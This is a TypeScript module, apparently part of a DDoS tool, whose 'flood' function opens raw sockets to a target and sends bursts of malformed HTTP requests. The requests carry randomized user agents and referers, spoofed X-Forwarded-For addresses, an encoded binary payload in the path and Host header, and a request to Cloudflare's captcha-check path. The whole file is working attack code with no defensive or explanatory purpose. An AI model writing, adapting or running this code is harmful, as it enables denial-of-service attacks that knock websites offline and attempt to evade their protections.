import * as net from "net"
import { USER_AGENTS, REFERERS } from "@/lib/config"

function randomChoice<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)]
}

function randIp(): string {
  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
}

function parseUrl(url: string): { host: string; port: number; path: string } {
  const u = new URL(url.startsWith("http") ? url : `http://${url}`)
  return {
    host: u.hostname,
    port: parseInt(u.port) || 80,
    path: u.pathname || "/",
  }
}

const HEX_PAYLOAD = Buffer.from([0x84, 0x8B, 0x87, 0x8F, 0x99, 0x8F, 0x98, 0x9C, 0x8F, 0x98, 0xEA]).toString("binary")

export async function flood(
  url: string,
  rpc: number,
  onStats: (req: number, bytes: number) => void
): Promise<void> {
  const { host, port, path } = parseUrl(url)
  const p1 = `GET ${path}/${HEX_PAYLOAD} HTTP/1.1\r\nHost: ${host}/${HEX_PAYLOAD}\r\nUser-Agent: ${randomChoice(USER_AGENTS)}\r\nReferer: ${randomChoice(REFERERS)}\r\nX-Forwarded-For: ${randIp()}\r\nConnection: keep-alive\r\n\r\n`
  const p2 = `GET ${path}/cdn-cgi/l/chk_captcha HTTP/1.1\r\nHost: ${host}\r\n${HEX_PAYLOAD}\r\nUser-Agent: ${randomChoice(USER_AGENTS)}\r\nReferer: ${randomChoice(REFERERS)}\r\nX-Forwarded-For: ${randIp()}\r\nConnection: keep-alive\r\n\r\n`

  const p1Len = Buffer.byteLength(p1)
  const p2Len = Buffer.byteLength(p2)
  const run = () => {
    return new Promise<void>((resolve) => {
      const sock = net.createConnection({ host, port }, () => {
        sock.write(p1)
        onStats(1, p1Len)
        for (let i = 0; i < rpc; i++) {
          sock.write(p2)
          onStats(1, p2Len)
        }
        sock.end()
        resolve()
      })
      sock.on("error", () => resolve())
      sock.setTimeout(5000, () => {
        sock.destroy()
        resolve()
      })
    })
  }

  await run()
}
